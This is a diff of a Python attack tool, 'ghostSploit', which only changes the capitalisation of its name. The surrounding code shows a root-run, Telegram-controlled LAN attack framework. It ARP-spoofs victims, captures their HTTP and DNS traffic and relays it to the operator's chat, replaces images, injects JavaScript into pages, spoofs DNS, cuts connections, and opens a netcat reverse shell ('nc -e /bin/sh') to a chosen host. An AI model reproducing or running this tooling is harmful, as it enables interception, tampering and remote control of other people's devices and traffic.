@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -.- coding: utf-8 -.-
-# GhostSploit.py
+# ghostSploit.py
 # author: akukisopo
 
 try:
@@ -286,8 +286,8 @@ def subscriptionHandler(bot):
 def arpSpoof(target):
     global iface_mac, gw_ip
     print("[+] ARP Spoofing " + str(target[0]) + "...")
-    os.system("sudo screen -S GhostSploit-arp-" + target[0] + "-0 -m -d arpspoof -t " + target[0] + " " + gw_ip + " -i " + interface)
-    os.system("sudo screen -S GhostSploit-arp-" + target[0] + "-1 -m -d arpspoof -t " + gw_ip + " " + target[0] + " -i " + interface)
+    os.system("sudo screen -S ghostSploit-arp-" + target[0] + "-0 -m -d arpspoof -t " + target[0] + " " + gw_ip + " -i " + interface)
+    os.system("sudo screen -S ghostSploit-arp-" + target[0] + "-1 -m -d arpspoof -t " + gw_ip + " " + target[0] + " -i " + interface)
 
 def mitmHandler(target, ID, bot):
     global admin_chatid, script_path
@@ -295,15 +295,15 @@ def mitmHandler(target, ID, bot):
     while True:
         if attackManager("isrunning", ID=ID) == True:
             try:
-                DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+                DBconn = sqlite3.connect(script_path + "ghostSploit.db")
                 DBcursor = DBconn.cursor()
-                DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_mitm (id integer primary key autoincrement, source TEXT, host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
+                DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_mitm (id integer primary key autoincrement, source TEXT, host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
                 DBconn.commit()
-                DBcursor.execute("SELECT * FROM GhostSploit_mitm")
+                DBcursor.execute("SELECT * FROM ghostSploit_mitm")
                 data = DBcursor.fetchall()
                 DBconn.close()
 
-                DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+                DBconn = sqlite3.connect(script_path + "ghostSploit.db")
                 DBcursor = DBconn.cursor()
                 textline = "📱 MITM - " + target[0] + "\n\n"
                 for item in data:
@@ -322,7 +322,7 @@ def mitmHandler(target, ID, bot):
                         if len(textline + temp_textline) > 3000:
                             break
                         textline += temp_textline
-                    DBcursor.execute("DELETE FROM GhostSploit_mitm WHERE id=?", [str(item[0])])
+                    DBcursor.execute("DELETE FROM ghostSploit_mitm WHERE id=?", [str(item[0])])
                     DBconn.commit()
                 if not textline == "📱 MITM - " + target[0] + "\n\n":
                     bot.send_message(chat_id=admin_chatid, text=textline)
@@ -338,17 +338,17 @@ def attackManager(action, attack_type=False, target=False, ID=False):
     global running_attacks
     # Layout: [[ID, attack_type, target]]
 
-    DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+    DBconn = sqlite3.connect(script_path + "ghostSploit.db")
     DBcursor = DBconn.cursor()
-    DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_attacks (id integer primary key autoincrement, attackid TEXT, attack_type TEXT, target TEXT)")
+    DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_attacks (id integer primary key autoincrement, attackid TEXT, attack_type TEXT, target TEXT)")
     DBconn.commit()
     DBconn.close()
 
-    DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+    DBconn = sqlite3.connect(script_path + "ghostSploit.db")
     DBcursor = DBconn.cursor()
 
     def getNewID():
-        DBcursor.execute("SELECT attackid FROM GhostSploit_attacks ORDER BY id DESC LIMIT 1")
+        DBcursor.execute("SELECT attackid FROM ghostSploit_attacks ORDER BY id DESC LIMIT 1")
         data = DBcursor.fetchone()
         if data == None:
             return 1
@@ -357,12 +357,12 @@ def attackManager(action, attack_type=False, target=False, ID=False):
 
     if action == "new":
         ID = getNewID()
-        DBcursor.execute("INSERT INTO GhostSploit_attacks(attackid, attack_type, target) VALUES (?, ?, ?)", [str(ID), attack_type, target])
+        DBcursor.execute("INSERT INTO ghostSploit_attacks(attackid, attack_type, target) VALUES (?, ?, ?)", [str(ID), attack_type, target])
         DBconn.commit()
         return ID
 
     elif action == "del":
-        DBcursor.execute("DELETE FROM GhostSploit_attacks WHERE attackid=?", [str(ID)])
+        DBcursor.execute("DELETE FROM ghostSploit_attacks WHERE attackid=?", [str(ID)])
         DBconn.commit()
         if DBcursor.rowcount == 1:
             return True
@@ -370,7 +370,7 @@ def attackManager(action, attack_type=False, target=False, ID=False):
             return False
 
     elif action == "isrunning":
-        DBcursor.execute("SELECT attackid FROM GhostSploit_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
+        DBcursor.execute("SELECT attackid FROM ghostSploit_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
         data = DBcursor.fetchone()
         if data == None:
             return False
@@ -378,7 +378,7 @@ def attackManager(action, attack_type=False, target=False, ID=False):
             return True
 
     elif action == "isattacked":
-        DBcursor.execute("SELECT attackid FROM GhostSploit_attacks WHERE target=? ORDER BY id DESC LIMIT 1", [target])
+        DBcursor.execute("SELECT attackid FROM ghostSploit_attacks WHERE target=? ORDER BY id DESC LIMIT 1", [target])
         data = DBcursor.fetchone()
         if data == None:
             return False
@@ -386,7 +386,7 @@ def attackManager(action, attack_type=False, target=False, ID=False):
             return True
 
     elif action == "gettype":
-        DBcursor.execute("SELECT attack_type FROM GhostSploit_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
+        DBcursor.execute("SELECT attack_type FROM ghostSploit_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
         data = DBcursor.fetchone()
         if data == None:
             return False
@@ -394,7 +394,7 @@ def attackManager(action, attack_type=False, target=False, ID=False):
             return data[0]
 
     elif action == "gettarget":
-        DBcursor.execute("SELECT target FROM GhostSploit_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
+        DBcursor.execute("SELECT target FROM ghostSploit_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
         data = DBcursor.fetchone()
         if data == None:
             return False
@@ -402,7 +402,7 @@ def attackManager(action, attack_type=False, target=False, ID=False):
             return data[0]
 
     elif action == "getids":
-        DBcursor.execute("SELECT attackid FROM GhostSploit_attacks WHERE target=?", [target])
+        DBcursor.execute("SELECT attackid FROM ghostSploit_attacks WHERE target=?", [target])
         data = DBcursor.fetchall()
         if data == None:
             return []
@@ -410,7 +410,7 @@ def attackManager(action, attack_type=False, target=False, ID=False):
             return data
 
     elif action == "list":
-        DBcursor.execute("SELECT attackid, attack_type, target FROM GhostSploit_attacks")
+        DBcursor.execute("SELECT attackid, attack_type, target FROM ghostSploit_attacks")
         data = DBcursor.fetchall()
         if data == None:
             return []
@@ -425,8 +425,8 @@ def stopAttack(ID):
 
     if not attackManager("isattacked", target=target):
         print("[+] Stopping ARP Spoof for " + target + "...")
-        os.system("sudo screen -S GhostSploit-arp-" + target + "-0 -X stuff '^C\n'")
-        os.system("sudo screen -S GhostSploit-arp-" + target + "-1 -X stuff '^C\n'")
+        os.system("sudo screen -S ghostSploit-arp-" + target + "-0 -X stuff '^C\n'")
+        os.system("sudo screen -S ghostSploit-arp-" + target + "-1 -X stuff '^C\n'")
 
     global script_path
     if atype == "kill":
@@ -438,45 +438,45 @@ def stopAttack(ID):
     elif atype == "replaceimg":
         iptables("stopmitm", target=target)
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
         DBconn.commit()
         DBconn.close()
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("DELETE FROM GhostSploit_img WHERE attackid=?", [str(ID)])
+        DBcursor.execute("DELETE FROM ghostSploit_img WHERE attackid=?", [str(ID)])
         DBconn.commit()
         DBconn.close()
 
     elif atype == "injectjs":
         iptables("stopmitm", target=target)
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_js (attackid TEXT, target TEXT, jsurl TEXT)")
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_js (attackid TEXT, target TEXT, jsurl TEXT)")
         DBconn.commit()
         DBconn.close()
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("DELETE FROM GhostSploit_js WHERE attackid=?", [str(ID)])
+        DBcursor.execute("DELETE FROM ghostSploit_js WHERE attackid=?", [str(ID)])
         DBconn.commit()
         DBconn.close()
 
     elif atype == "spoofdns":
         iptables("stopspoofdns", target=target)
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
         DBconn.commit()
         DBconn.close()
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("DELETE FROM GhostSploit_dns WHERE attackid=?", [str(ID)])
+        DBcursor.execute("DELETE FROM ghostSploit_dns WHERE attackid=?", [str(ID)])
         DBconn.commit()
         DBconn.close()
 
@@ -490,8 +490,8 @@ def stopping():
     print("\n\n[+] Stopping...")
     stop_updater_t = threading.Thread(target=stop_updater)
     stop_updater_t.start()
-    os.system("sudo screen -S GhostSploit-mitm -X stuff '^C\n'")
-    os.system("sudo screen -S GhostSploit-dns -X stuff '^C\n'")
+    os.system("sudo screen -S ghostSploit-mitm -X stuff '^C\n'")
+    os.system("sudo screen -S ghostSploit-dns -X stuff '^C\n'")
     iptables("flush")
     attacks = attackManager("list")
     if not attacks == []:
@@ -500,8 +500,8 @@ def stopping():
         stopAttack(attack[0])
     if not attacks == []:
         time.sleep(5)
-    os.system("sudo rm -r " + script_path + "GhostSploit.db > /dev/null 2>&1")
-    print("[+] GhostSploit stopped")
+    os.system("sudo rm -r " + script_path + "ghostSploit.db > /dev/null 2>&1")
+    print("[+] ghostSploit stopped")
     raise SystemExit
 
 def restart_thread():
@@ -512,8 +512,8 @@ def restarting():
     print("\n\n[+] Restarting...")
     stop_updater_t = threading.Thread(target=stop_updater)
     stop_updater_t.start()
-    os.system("sudo screen -S GhostSploit-mitm -X stuff '^C\n'")
-    os.system("sudo screen -S GhostSploit-dns -X stuff '^C\n'")
+    os.system("sudo screen -S ghostSploit-mitm -X stuff '^C\n'")
+    os.system("sudo screen -S ghostSploit-dns -X stuff '^C\n'")
     iptables("flush")
     attacks = attackManager("list")
     if not attacks == []:
@@ -522,8 +522,8 @@ def restarting():
         stopAttack(attack[0])
     if not attacks == []:
         time.sleep(5)
-    os.system("sudo rm -r " + script_path + "GhostSploit.db > /dev/null 2>&1")
-    print("[+] GhostSploit stopped")
+    os.system("sudo rm -r " + script_path + "ghostSploit.db > /dev/null 2>&1")
+    print("[+] ghostSploit stopped")
     restart_t = threading.Thread(target=restart_thread)
     restart_t.start()
 
@@ -535,7 +535,7 @@ def msg_start(bot, update):
         return
 
     try:
-        bot.send_message(chat_id=update.message.chat_id, text="Welcome to GhostSploit! 👻")
+        bot.send_message(chat_id=update.message.chat_id, text="Welcome to ghostSploit! 👻")
     except:
         print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
@@ -709,17 +709,17 @@ def msg_img(bot, update):
     try:
         global script_path
         try:
-            DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+            DBconn = sqlite3.connect(script_path + "ghostSploit.db")
             DBcursor = DBconn.cursor()
-            DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
+            DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
             DBconn.commit()
             DBconn.close()
         except:
             return
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("SELECT * FROM GhostSploit_img")
+        DBcursor.execute("SELECT * FROM ghostSploit_img")
         data = DBcursor.fetchall()
         if not data == []:
             for attack in data:
@@ -741,7 +741,7 @@ def msg_img(bot, update):
                     else:
                         ID = attackManager("new", attack_type="replaceimg", target=target[0])
 
-                    DBcursor.execute("UPDATE GhostSploit_img SET img=?, attackid=?  WHERE target=?", [img64, str(ID), attack[1]])
+                    DBcursor.execute("UPDATE ghostSploit_img SET img=?, attackid=?  WHERE target=?", [img64, str(ID), attack[1]])
                     DBconn.commit()
 
                     bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
@@ -778,15 +778,15 @@ def msg_replaceimg(bot, update, args):
         target = [target_ip, target_mac]
         target = json.dumps(target)
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
         DBconn.commit()
         DBconn.close()
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("INSERT INTO GhostSploit_img VALUES (?, ?, ?, ?)", ["false", target, "false", target_ip])
+        DBcursor.execute("INSERT INTO ghostSploit_img VALUES (?, ?, ?, ?)", ["false", target, "false", target_ip])
         DBconn.commit()
         DBconn.close()
 
@@ -827,9 +827,9 @@ def msg_spoofdns(bot, update, args):
 
         target = [target_ip, target_mac]
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
         DBconn.commit()
         DBconn.close()
 
@@ -842,9 +842,9 @@ def msg_spoofdns(bot, update, args):
         else:
             ID = attackManager("new", attack_type="spoofdns", target=target[0])
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("INSERT INTO GhostSploit_dns VALUES (?, ?, ?, ?)", [str(ID), target[0], domain, fakeip])
+        DBcursor.execute("INSERT INTO ghostSploit_dns VALUES (?, ?, ?, ?)", [str(ID), target[0], domain, fakeip])
         DBconn.commit()
         DBconn.close()
 
@@ -886,9 +886,9 @@ def msg_injectjs(bot, update, args):
 
         target = [target_ip, target_mac]
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_js (attackid TEXT, target TEXT, jsurl TEXT)")
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS ghostSploit_js (attackid TEXT, target TEXT, jsurl TEXT)")
         DBconn.commit()
         DBconn.close()
 
@@ -903,9 +903,9 @@ def msg_injectjs(bot, update, args):
 
         jsurl64 = base64.b64encode(jsurl.encode("UTF-8"))
 
-        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
+        DBconn = sqlite3.connect(script_path + "ghostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("INSERT INTO GhostSploit_js VALUES (?, ?, ?)", [str(ID), target[0], jsurl64])
+        DBcursor.execute("INSERT INTO ghostSploit_js VALUES (?, ?, ?)", [str(ID), target[0], jsurl64])
         DBconn.commit()
         DBconn.close()
 
@@ -923,10 +923,10 @@ def msg_help(bot, update):
         return
 
     try:
-        bot.send_message(chat_id=update.message.chat_id, text="👻 GhostSploit help:\n\n/scan - Scan LAN network\n/scanip [TARGET-IP] - Scan a specific IP address.\n/kill [TARGET-IP] - Stop the target's network connection.\n" +\
+        bot.send_message(chat_id=update.message.chat_id, text="👻 ghostSploit help:\n\n/scan - Scan LAN network\n/scanip [TARGET-IP] - Scan a specific IP address.\n/kill [TARGET-IP] - Stop the target's network connection.\n" +\
                                                                 "/mitm [TARGET-IP] - Capture HTTP/DNS traffic from target.\n/replaceimg [TARGET-IP] - Replace HTTP images requested by target.\n" +\
                                                                 "/injectjs [TARGET-IP] [JS-FILE-URL] - Inject JavaScript into HTTP pages requested by target.\n/spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Spoof DNS records for target.\n" +\
-                                                                "/attacks - View currently running attacks.\n/stop [ATTACK-ID] - Stop a currently running attack.\n/restart - Restart GhostSploit.\n" +\
+                                                                "/attacks - View currently running attacks.\n/stop [ATTACK-ID] - Stop a currently running attack.\n/restart - Restart ghostSploit.\n" +\
                                                                 "/reversesh [TARGET-IP] [PORT] - Create a netcat reverse shell to target.\n/help - Display this menu.\n/ping - Pong.")
     except:
         print("[!!!] " + str(traceback.format_exc()))
@@ -950,7 +950,7 @@ def msg_restart(bot, update):
         return
 
     try:
-        bot.send_message(chat_id=update.message.chat_id, text="✅ Restarting GhostSploit...")
+        bot.send_message(chat_id=update.message.chat_id, text="✅ Restarting ghostSploit...")
         restarting()
     except:
         print("[!!!] " + str(traceback.format_exc()))
@@ -982,8 +982,8 @@ def msg_reversesh(bot, update, args):
             return
 
         bot.send_message(chat_id=update.message.chat_id, text="✅ Starting reverse shell...")
-        os.system("sudo screen -S GhostSploit-reversesh -X stuff '^C\n' > /dev/null 2>&1")
-        os.system("sudo screen -S GhostSploit-reversesh -m -d nc -e /bin/sh " + target_ip + " " + str(port))
+        os.system("sudo screen -S ghostSploit-reversesh -X stuff '^C\n' > /dev/null 2>&1")
+        os.system("sudo screen -S ghostSploit-reversesh -m -d nc -e /bin/sh " + target_ip + " " + str(port))
     except:
         print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
@@ -1038,7 +1038,7 @@ def main():
     dispatcher = updater.dispatcher
     bot = updater.bot
 
-    bot.send_message(chat_id=admin_chatid, text="GhostSploit started! 👻")
+    bot.send_message(chat_id=admin_chatid, text="ghostSploit started! 👻")
 
     t = threading.Thread(target=subscriptionHandler, args=[bot])
     t.daemon = True
@@ -1086,7 +1086,7 @@ def main():
 
 if __name__ == '__main__':
     if os.geteuid() != 0:
-        print("[!] Please run GhostSploit as root!")
+        print("[!] Please run ghostSploit as root!")
         raise SystemExit
 
     script_path = os.path.dirname(os.path.realpath(__file__)) + "/"
@@ -1148,10 +1148,10 @@ if __name__ == '__main__':
     except:
         print(header + """                         v1.0 """ + WHITE + """by @akukisopo    """ + "\n" + END)
 
-    os.system("rm -r " + script_path + "GhostSploit.db > /dev/null 2>&1")
+    os.system("rm -r " + script_path + "ghostSploit.db > /dev/null 2>&1")
 
-    os.system("sudo screen -S GhostSploit-mitm -m -d mitmdump -T --host -s " + script_path + "proxyScript.py")
-    os.system("sudo screen -S GhostSploit-dns -m -d python3 " + script_path + "dnsServer.py")
+    os.system("sudo screen -S ghostSploit-mitm -m -d mitmdump -T --host -s " + script_path + "proxyScript.py")
+    os.system("sudo screen -S ghostSploit-dns -m -d python3 " + script_path + "dnsServer.py")
     refreshNetworkInfo()
     iptables("setup")
 
